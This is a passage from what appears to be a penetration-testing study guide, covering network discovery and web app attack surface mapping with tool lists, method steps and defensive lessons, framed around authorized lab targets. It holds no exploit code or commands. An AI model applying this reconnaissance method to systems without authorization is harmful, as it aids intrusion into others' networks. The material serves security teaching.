certificate/DNS changes, audit repos, and remove stale assets. **Search words:** osint, recon, social media, instagram, whatsapp, username, domain, email, people search

title: 3. Network Discovery and Service Enumeration
text: **Objective:** Map live hosts, open ports, services, versions, and risky network exposure. **Safe lab:** Your own VLAN, VM subnet, router lab, or authorized internal range. **Tools to use:** - **nmap:** Host discovery, port scanning, service/version detection, scripts - **RustScan:** Fast initial port discovery - **masscan:** Very fast large-range port discovery; lab or approved ranges only - **Wireshark/tcpdump:** Inspect traffic and verify what the scanner caused - **NetExec/smbmap:** Enumerate SMB shares and Windows services in a lab - **snmpwalk/dnsrecon:** Enumerate SNMP and DNS where authorized **Related tools from the 1000-tool catalog:** `GyulyVGC/sniffnet`, `fail2ban/fail2ban`, `OpenNHP/opennhp`, `secdev/scapy`, `ntop/ntopng`, `bee-san/pyWhat` **Method steps:** 1. Confirm the subnet and scope before sending packets. 2. Run host discovery and create a live-host inventory. 3. Scan TCP ports first, then selected UDP services where needed. 4. Identify service names, versions, banners, TLS certificates, and management interfaces. 5. Prioritize risky exposure: admin panels, SMB, RDP, databases, printers, IoT, and default services. 6. Validate findings manually; scanners are noisy and can be wrong. 7. Compare open exposure with business need and close what is unnecessary. **Evidence to capture:** Host list, port table, service versions, packet captures, screenshots of exposed interfaces. **Defense to teach:** Segment networks, disable unused services, restrict management interfaces, monitor scans. **Search words:** network, ip address, port scan, nmap, packet, pcap, router, smb

title: 4. Web App Attack Surface Mapping
text: **Objective:** Find the pages, parameters, APIs, files, and trust boundaries worth testing. **Safe lab:** DVWA, Juice Shop, WebGoat, or your own staging app. **Tools to use:** - **Burp Suite:** Intercept, map, replay, and analyze requests - **OWASP ZAP:** Free proxy and baseline web scanning - **ffuf/feroxbuster/gobuster:** Discover routes, files, parameters, and virtual hosts - **katana:** Crawl modern web apps - **nuclei:** Run templated checks against approved targets - **Nikto:** Find common web server misconfigurations **Related tools from the 1000-tool catalog:** `KeygraphHQ/shannon`, `sqlmapproject/sqlmap`, `chaitin/SafeLine`, `ffuf/ffuf`, `juice-shop/juice-shop`, `digininja/DVWA` **Method steps:** 1. Proxy the browser through Burp or ZAP and browse every app function like a normal user. 2. Build a site map: pages, parameters, forms, uploads, APIs, roles, and authentication boundaries. 3.
